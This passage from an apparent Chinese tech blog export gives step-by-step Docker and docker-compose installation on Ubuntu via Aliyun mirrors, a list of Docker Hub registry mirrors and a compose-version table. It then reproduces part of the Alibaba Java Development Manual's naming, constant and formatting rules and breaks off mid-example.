<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/bin/docker-compose /usr/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="（4）验证安装是否完成">（4）验证安装是否完成</h3>
<p>执行如下命令，如果可以正常显示版本号，则表示已经完成</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker-compose</span> <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>Ubuntu 配置Docker环境</h1>
<h2 id="1-卸载旧版本Docker">1.卸载旧版本Docker</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#卸载旧版本docker</span>
<span class="token function">apt-get</span> remove <span class="token function">docker</span> docker-engine docker-ce docker.io  

<span class="token comment">#清空旧版docker占用的内存</span>
<span class="token function">apt-get</span> remove --auto-remove <span class="token function">docker</span>

<span class="token comment">#更新系统源</span>
<span class="token function">apt-get</span> update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="2-配置安装环境">2.配置安装环境</h2>
<pre class="line-numbers language-none"><code class="language-none">apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="3-添加阿里云的docker-GPG密钥">3. 添加阿里云的docker GPG密钥</h2>
<pre class="line-numbers language-none"><code class="language-none">curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | apt-key add -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="4-添加阿里镜像源">4. 添加阿里镜像源</h2>
<pre class="line-numbers language-none"><code class="language-none">add-apt-repository "deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable"

#更新
apt-get update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="5-查看有哪些版本">5. 查看有哪些版本</h2>
<pre class="line-numbers language-none"><code class="language-none">apt-cache madison docker-ce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><a href="https://img-blog.csdnimg.cn/20200613220949677.png"><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/20200613220949677-1678135240557-71-1680604004354-14.png" alt="img"></a></p>
<h2 id="6-安装最新版-指定版本">6. 安装最新版/指定版本</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#安装最新版</span>
<span class="token function">apt-get</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> docker-ce

<span class="token comment">#安装5:19.03.6~3-0~ubuntu-bionic版</span>
<span class="token function">apt-get</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> docker-ce<span class="token operator">=</span><span class="token number">5</span>:19.03.6~3-0~ubuntu-bionic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="7-重启Docker">7. 重启Docker</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> <span class="token function">docker</span> restart
<span class="token comment"># 或者</span>
systemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="8-查看Docke版本">8. 查看Docke版本</h2>
<pre class="line-numbers language-none"><code class="language-none">docker version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="9-配置容器镜像加速器">9. 配置容器镜像加速器</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /etc/docker
<span class="token function">vim</span> /etc/docker/daemon.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>添加内容</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"https://7ixh250y.mirror.aliyuncs.com"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token property">"data-root"</span><span class="token operator">:</span> <span class="token string">"/data/docker_mirror"</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>查看填写内容</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/docker/daemon.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>registry-mirrors： 镜像加速</p>
<p>insecure-registries： 私有仓库地址</p>
<p>data-root：docker 数据保存地址，放到盘大的目录防止根目录的盘满</p>
</blockquote>
<p>重启 Docker 服务</p>
<pre class="line-numbers language-none"><code class="language-none">$ systemctl daemon-reload 
$ systemctl restart docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>检查设置是否生效</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> info
$ <span class="token function">docker</span> run hello-world<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="10-运行hello-world验证docker-ce是否安装成功">10. 运行hello-world验证docker-ce是否安装成功</h2>
<pre class="line-numbers language-none"><code class="language-none">docker run --rm hello-world<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>安装成功显示</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230404183345217.png" alt="image-20230404183345217"></p>
<h2 id="11-安装docker-compose">11. 安装docker-compose</h2>
<ul>
<li>
<p>安装docker-compose</p>
  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 安装pip</span>
<span class="token function">apt</span> <span class="token function">install</span> python3-pip
<span class="token comment"># 更新一下库</span>
<span class="token function">apt-get</span> update
<span class="token comment"># 更新一下pip</span>
pip3 <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pip
<span class="token comment"># 安装docker-compose</span>
pip3 <span class="token function">install</span> <span class="token function">docker-compose</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果出错</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/2020061322045958-1678135240557-77-1680604004355-18.png" alt="img"></p>
<p>就更新一下 six</p>
  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip3 <span class="token function">install</span> six <span class="token parameter variable">--user</span> <span class="token parameter variable">-U</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>查看docker-compose版本</p>
  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker-compose</span> <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ul>
<h1>Docker Hub 镜像加速器列表</h1>
<table>
<thead>
<tr>
<th>镜像加速器</th>
<th>镜像加速器地址</th>
<th>专属加速器<a href="https://gist.github.com/y0ngb1n/7e8f16af3242c7815e7ca2f0833d3ea6#">？</a></th>
<th>其它加速<a href="https://gist.github.com/y0ngb1n/7e8f16af3242c7815e7ca2f0833d3ea6#">？</a></th>
</tr>
</thead>
<tbody>
<tr>
<td><s><a href="https://docker-cn.com/registry-mirror">Docker 中国官方镜像</a></s></td>
<td><s><code>https://registry.docker-cn.com</code></s></td>
<td></td>
<td><s>Docker Hub</s>（<a href="https://github.com/docker/docker.github.io/issues/8793">已关闭</a>）</td>
</tr>
<tr>
<td><a href="https://daocloud.io/mirror">DaoCloud 镜像站</a></td>
<td><code>http://f1361db2.m.daocloud.io</code></td>
<td>可登录，系统分配</td>
<td>Docker Hub</td>
</tr>
<tr>
<td><a href="https://github.com/Azure/container-service-for-azure-china/blob/master/aks/README.md#22-container-registry-proxy">Azure 中国镜像</a></td>
<td><code>https://dockerhub.azk8s.cn</code></td>
<td>仅供内部访问</td>
<td>Docker Hub、GCR、Quay</td>
</tr>
<tr>
<td><a href="https://mirrors.ustc.edu.cn/help/dockerhub.html">科大镜像站</a></td>
<td><code>https://docker.mirrors.ustc.edu.cn</code></td>
<td></td>
<td>Docker Hub、<a href="https://github.com/ustclug/mirrorrequest/issues/91">GCR</a>、<a href="https://github.com/ustclug/mirrorrequest/issues/135">Quay</a></td>
</tr>
<tr>
<td><a href="https://cr.console.aliyun.com/">阿里云</a></td>
<td><code>https://&lt;your_code&gt;.mirror.aliyuncs.com</code></td>
<td>需登录，系统分配</td>
<td>Docker Hub</td>
</tr>
<tr>
<td><s><a href="https://kirk-enterprise.github.io/hub-docs/#/user-guide/mirror">七牛云</a></s></td>
<td><s><code>https://reg-mirror.qiniu.com</code></s></td>
<td></td>
<td><s>Docker Hub、GCR、Quay</s></td>
</tr>
<tr>
<td><a href="https://c.163yun.com/hub">网易云</a></td>
<td><code>https://hub-mirror.c.163.com</code></td>
<td></td>
<td>Docker Hub</td>
</tr>
<tr>
<td><a href="https://cloud.tencent.com/document/product/457/9113">腾讯云</a></td>
<td><code>https://mirror.ccs.tencentyun.com</code></td>
<td>仅供内部访问</td>
<td>Docker Hub</td>
</tr>
<tr>
<td><a href="https://dockerproxy.com/">Docker 镜像代理</a></td>
<td><code>https://dockerproxy.com</code></td>
<td></td>
<td>Docker Hub、GCR、K8S、GHCR</td>
</tr>
<tr>
<td><a href="https://cloud.baidu.com/doc/CCE/s/Yjxppt74z#%E4%BD%BF%E7%94%A8dockerhub%E5%8A%A0%E9%80%9F%E5%99%A8">百度云</a></td>
<td><code>https://mirror.baidubce.com</code></td>
<td></td>
<td>Docker Hub</td>
</tr>
</tbody>
</table>
<h1>docker-compose.yml 版本</h1>
<table>
<thead>
<tr>
<th>Compose file format</th>
<th>Docker Engine release</th>
</tr>
</thead>
<tbody>
<tr>
<td>3.8</td>
<td>19.03.0+</td>
</tr>
<tr>
<td>3.7</td>
<td>18.06.0+</td>
</tr>
<tr>
<td>3.6</td>
<td>18.02.0+</td>
</tr>
<tr>
<td>3.5</td>
<td>17.12.0+</td>
</tr>
<tr>
<td>3.4</td>
<td>17.09.0+</td>
</tr>
<tr>
<td>3.3</td>
<td>17.06.0+</td>
</tr>
<tr>
<td>3.2</td>
<td>17.04.0+</td>
</tr>
<tr>
<td>3.1</td>
<td>1.13.1+</td>
</tr>
<tr>
<td>3</td>
<td>1.13.0+</td>
</tr>
<tr>
<td>2.4</td>
<td>17.12.0+</td>
</tr>
<tr>
<td>2.3</td>
<td>17.06.0+</td>
</tr>
<tr>
<td>2.2</td>
<td>1.13.0+</td>
</tr>
<tr>
<td>2.1</td>
<td>1.12.0+</td>
</tr>
<tr>
<td>2</td>
<td>1.10.0+</td>
</tr>
<tr>
<td>1</td>
<td>1.9.1.+</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Java开发手册【阿里巴巴】</title>
    <url>/20221025/ba2334ee.html</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>版本号</th>
<th>制定团队</th>
<th>更新日期</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>1.7.0</td>
<td>阿里巴巴与全球 Java 社区开发者</td>
<td>2020.08.03</td>
<td>嵩山版，首次发布前后端规约</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h1>一、 编程规约</h1>
<h2 id="一-命名风格">(一)  命名风格</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>代码中的命名均不能以下划线或美元符号开始，也不能以下划线或美元符号结束。    <font color=" #FF4500">反例：</font><font color="red">_name / __name / $name / name_ / name$ / name__ </font></p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>所有编程相关的命名严禁使用拼音与英文混合的方式，更不允许直接使用中文的方式。<br>
<font color=" #977C00">说明：</font>正确的英文拼写和语法可以让阅读者易于理解，避免歧义。注意，纯拼音命名方式更要避免采用。</p>
<p><font color="#019858">正例：</font>ali / alibaba / taobao / cainiao/ aliyun/ youku / hangzhou  等国际通用的名称，可视同英文。</p>
<p><font color=" #FF4500">反例：</font>DaZhePromotion [打折] / getPingfenByName() [评分] / String fw[福娃] / int  某变量 = 3</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>代码和注释中都要避免使用任何语言的种族歧视性词语。</p>
<p><font color="#019858">正例：</font>日本人 /  印度人 / blockList / allowList / secondary</p>
<p><font color=" #FF4500">反例：</font>RIBENGUIZI / Asan / blackList / whiteList / slave</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>类名使用 UpperCamelCase 风格，但以下情形例外：DO / BO / DTO / VO / AO / PO / UID 等。</p>
<p><font color="#019858">正例：</font>ForceCode  /  UserDO  /  HtmlDTO  /  XmlService  /  TcpUdpDeal  /  TaPromotion</p>
<p><font color=" #FF4500">反例：</font>forcecode  /  UserDo  /  HTMLDto  /  XMLService  /  TCPUDPDeal  /  TAPromotion</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>方法名、参数名、成员变量、局部变量都统一使用 lowerCamelCase 风格。     <font color="#019858">正例：</font> localValue / getHttpMessage() / inputUserId</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>常量命名全部大写，单词间用下划线隔开，力求语义表达完整清楚，不要嫌名字长。</p>
<p><font color="#019858">正例：</font>MAX_STOCK_COUNT / CACHE_EXPIRED_TIME</p>
<p><font color=" #FF4500">反例：</font>MAX_COUNT / EXPIRED_TIME</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>抽象类命名使用 Abstract 或 Base 开头；异常类命名使用 Exception 结尾；测试类 命名以它要测试的类的名称开始，以 Test 结尾。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>类型与中括号紧挨相连来表示数组。</p>
<p><font color="#019858">正例：</font>定义整形数组 int[] arrayDemo。</p>
<p><font color=" #FF4500">反例：</font>在 main 参数中，使用 String args[]来定义。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>POJO 类中的任何布尔类型的变量，都不要加 is 前缀，否则部分框架解析会引起序列化错误。</p>
<p><font color=" #977C00">说明：</font>在本文 MySQL 规约中的建表约定第一条，表达是与否的变量采用 is_xxx 的命名方式，所以，需要在<resultmap>设置从 is_xxx 到 xxx 的映射关系。</resultmap></p>
<p><font color=" #FF4500">反例：</font>定义为基本数据类型 Boolean isDeleted 的属性，它的方法也是 isDeleted()，框架在反向解析的时 候，“误以为”对应的属性名称是 deleted，导致属性获取不到，进而抛出异常。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>包名统一使用小写，点分隔符之间有且仅有一个自然语义的英语单词。包名统一使用<font color="blue">单数</font>形式，但是类名如果有复数含义，类名可以使用复数形式。</p>
<p><font color="#019858">正例：</font>应用工具类包名为 com.alibaba.ei.kunlun.aap.util、类名为 MessageUtils（此规则参考 spring 的 框架结构）</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>避免在子父类的成员变量之间、或者不同代码块的局部变量之间采用完全相同的命名， 使可理解性降低。</p>
<p><font color=" #977C00">说明：</font>子类、父类成员变量名相同，即使是 public 类型的变量也能够通过编译，另外，局部变量在同一方 法内的不同代码块中同名也是合法的，这些情况都要避免。对于非 setter/getter 的参数名称也要避免与成员变量名称相同。</p>
<p><font color=" #FF4500">反例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConfusingName</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">int</span> stock<span class="token punctuation">;</span>

    <span class="token comment">// 非setter/getter的参数名称，不允许与本类成员变量同名</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">String</span> alibaba<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>condition<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">final</span> <span class="token keyword">int</span> money <span class="token operator">=</span> <span class="token number">666</span><span class="token punctuation">;</span>
            <span class="token comment">// ...</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 在同一方法体中，不允许与其它代码块中的money命名相同</span>
            <span class="token keyword">final</span> <span class="token keyword">int</span> money <span class="token operator">=</span> <span class="token number">15978</span><span class="token punctuation">;</span>
            <span class="token comment">// ...</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Son</span> <span class="token keyword">extends</span> <span class="token class-name">ConfusingName</span> <span class="token punctuation">{</span>
    <span class="token comment">// 不允许与父类的成员变量名称相同</span>
    <span class="token keyword">public</span> <span class="token keyword">int</span> stock<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>杜绝完全不规范的缩写，避免望文不知义。</p>
<p><font color=" #FF4500">反例：</font>AbstractClass“缩写”成 AbsClass；condition“缩写”成  condi；Function 缩写”成 Fu，此类 随意缩写严重降低了代码的可阅读性。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>为了达到代码自解释的目标，任何自定义编程元素在命名时，使用尽量完整的单词组 合来表达。</p>
<p><font color="#019858">正例：</font>对某个对象引用的 volatile 字段进行原子更新的类名为 AtomicReferenceFieldUpdater。</p>
<p><font color=" #FF4500">反例：</font>常见的方法内变量为 int a;的定义方式。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>在常量与变量的命名时，<strong>表示类型的名词放在词尾</strong>，以提升辨识度。</p>
<p><font color="#019858">正例：</font>startTime / workQueue / nameList / TERMINATED_THREAD_COUNT</p>
<p><font color=" #FF4500">反例：</font>startedAt / QueueOfWork / listName / COUNT_TERMINATED_THREAD</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>如果模块、接口、类、方法使用了设计模式，在命名时需体现出具体模式。</p>
<p><font color=" #977C00">说明：</font>将设计模式体现在名字中，有利于阅读者快速理解架构设计理念。</p>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OrderFactory</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LoginProxy</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ResourceObserver</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>接口类中的方法和属性不要加任何修饰符号（public  也不要加），保持代码的简洁 性，并加上有效的 Javadoc 注释。尽量不要在接口里定义变量，如果一定要定义变量，确定与接口方法相关，并且是整个应用的基础常量。</p>
<p><font color="#019858">正例：</font></p>
<pre><code>接口方法签名  void commit(); 
接口基础常量  String COMPANY = "alibaba";
</code></pre>
<p><font color=" #FF4500">反例：</font>接口方法定义  <code>public abstract void f(); </code></p>
<p><font color=" #977C00">说明：</font>JDK8 中接口允许有默认实现，那么这个 default 方法，是对所有实现类都有价值的默认实现。</p>
</li>
<li>
<p>接口和实现类的命名有两套规则：</p>
<ul>
<li>
<p><font color=" #C00000">【强制】</font>对于 Service 和 DAO 类，基于 SOA 的理念，暴露出来的服务一定是接口，内部的实现类用 Impl 的后缀与接口区别。</p>
<p><font color="#019858">正例：</font>CacheServiceImpl 实现 CacheService 接口。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>如果是形容能力的接口名称，取对应的形容词为接口名（通常是–able 的形容词）。<br>
<font color="#019858">正例：</font>AbstractTranslator 实现  Translatable 接口。</p>
</li>
</ul>
</li>
<li>
<p><font color="#76923C">【参考】</font>枚举类名带上 Enum 后缀，枚举成员名称需要全大写，单词间用下划线隔开。</p>
<p><font color=" #977C00">说明：</font>枚举其实就是特殊的常量类，且构造方法被默认强制是私有。</p>
<p><font color="#019858">正例：</font>枚举名字为 ProcessStatusEnum 的成员名称：SUCCESS / UNKNOWN_REASON。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>各层命名规约</p>
<ul>
<li>
<p>Service/DAO 层方法命名规约</p>
<p>1）  获取单个对象的方法用 get 做前缀。</p>
<p>2）  获取多个对象的方法用 list 做前缀，复数结尾，如：listObjects。</p>
<p>3）  获取统计值的方法用 count 做前缀。</p>
<p>4）  插入的方法用 save/insert 做前缀。</p>
<p>5）  删除的方法用 remove/delete 做前缀。</p>
<p>6）  修改的方法用 update 做前缀。</p>
</li>
<li>
<p>领域模型命名规约</p>
<p>1）  数据对象：xxxDO，xxx 即为数据表名。</p>
<p>2）  数据传输对象：xxxDTO，xxx 为业务领域相关的名称。</p>
<p>3）  展示对象：xxxVO，xxx 一般为网页名称。</p>
<p>4）  POJO 是 DO/DTO/BO/VO 的统称，禁止命名成 xxxPOJO。</p>
</li>
</ul>
</li>
</ol>
<h2 id="二-常量定义">(二)  常量定义</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>不允许任何魔法值（即未经预先定义的常量）直接出现在代码中。</p>
<p><font color=" #FF4500">反例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//  本例中，开发者 A 定义了缓存的 key，然后开发者 B 使用缓存时少了下划线，即 key 是"Id#taobao"+tradeId，导致 出现故障 </span>
<span class="token class-name">String</span> key <span class="token operator">=</span> <span class="token string">"Id#taobao\_"</span> <span class="token operator">+</span> tradeId<span class="token punctuation">;</span> 
cache<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>在 long 或者 Long 赋值时，数值后使用大写字母 L，不能是小写字母 l，小写容易跟 数字混淆，造成误解。</p>
<p><font color=" #977C00">说明：</font>Long a = 2l;  写的是数字的 21，还是 Long 型的 2？</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>不要使用一个常量类维护所有常量，要按常量功能进行归类，分开维护。</p>
<p><font color=" #977C00">说明：</font>大而全的常量类，杂乱无章，使用查找功能才能定位到修改的常量，不利于理解，也不利于维护。</p>
<p><font color="#019858">正例：</font>缓存相关常量放在类 CacheConsts 下；系统配置相关常量放在类 SystemConfigConsts 下。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>常量的复用层次有五层：跨应用共享常量、应用内共享常量、子工程内共享常量、包内共享常量、类内共享常量。</p>
<p>1）  跨应用共享常量：放置在二方库中，通常是 client.jar 中的 constant 目录下。</p>
<p>2）  应用内共享常量：放置在一方库中，通常是子模块中的 constant 目录下。</p>
<p><font color=" #FF4500">反例：</font>易懂变量也要统一定义成应用内共享常量，两位工程师在两个类中分别定义了“YES”的变量：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">类 <span class="token class-name">A</span> 中：<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">YES</span> <span class="token operator">=</span> <span class="token string">"yes"</span><span class="token punctuation">;</span>
类 <span class="token class-name">B</span> 中：<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">YES</span> <span class="token operator">=</span> <span class="token string">"y"</span><span class="token punctuation">;</span>
<span class="token class-name">A</span><span class="token punctuation">.</span><span class="token constant">YES</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">B</span><span class="token punctuation">.</span><span class="token constant">YES</span><span class="token punctuation">)</span>，预期是 <span class="token boolean">true</span>，但实际返回为 <span class="token boolean">false</span>，导致线上问题。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>3）  子工程内部共享常量：即在当前子工程的 constant 目录下。</p>
<p>4）  包内共享常量：即在当前包下单独的 constant 目录下。</p>
<p>5）  类内共享常量：直接在类内部 private static final 定义。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>如果变量值仅在一个固定范围内变化用 enum 类型来定义。</p>
<p><font color=" #977C00">说明：</font>如果存在名称之外的延伸属性应使用 enum 类型，下面正例中的数字就是延伸信息，表示一年中的 第几个季节。</p>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">SeasonEnum</span> <span class="token punctuation">{</span>
    <span class="token function">SPRING</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">SUMMER</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">AUTUMN</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">WINTER</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> seq<span class="token punctuation">;</span>
    <span class="token class-name">SeasonEnum</span><span class="token punctuation">(</span><span class="token keyword">int</span> seq<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>seq <span class="token operator">=</span> seq<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getSeq</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> seq<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h2 id="三-代码格式">(三)  代码格式</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>如果是大括号内为空，则简洁地写成{}即可，大括号中间无需换行和空格；如果是非空代码块则：</p>
<p>1）  左大括号前不换行。</p>
<p>2）  左大括号后换行。</p>
<p>3）  右大括号前换行。</p>
<p>4）  右大括号后还有 else 等代码则不换行；表示终止的右大括号后必须换行。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>左小括号和右边相邻字符之间不出现空格；右小括号和左边相邻字符之间也不出现空 格；而左大括号前需要加空格。详见第 5 条下方正例提示。</p>
<p><font color=" #FF4500">反例：</font>if (空格 a == b 空格)</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>if/for/while/switch/do 等保留字与括号之间都必须加空格。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>任何二目、三目运算符的左右两边都需要加一个空格。</p>
<p><font color=" #977C00">说明：</font>包括赋值运算符=、逻辑运算符&amp;&amp;、加减乘除符号等。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>采用 4 个空格缩进，禁止使用 Tab 字符。</p>
<p><font color=" #977C00">说明：</font>如果使用Tab缩进，必须设置1个Tab为4个空格。IDEA设置Tab为4个空格时，请勿勾选Use tab character；而在Eclipse中，必须勾选insert spaces for tabs。</p>
<p><font color="#019858">正例：</font> （涉及1-5 点）</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 缩进4个空格</span>
    <span class="token class-name">String</span> say <span class="token operator">=</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>
    <span class="token comment">// 运算符的左右必须有一个空格</span>
    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token comment">// 关键词if与括号之间必须有一个空格，括号内的f与左括号，0与右括号不需要空格</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>say<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 左大括号前加空格且不换行；左大括号后换行</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 右大括号前换行，右大括号后有else，不用换行</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
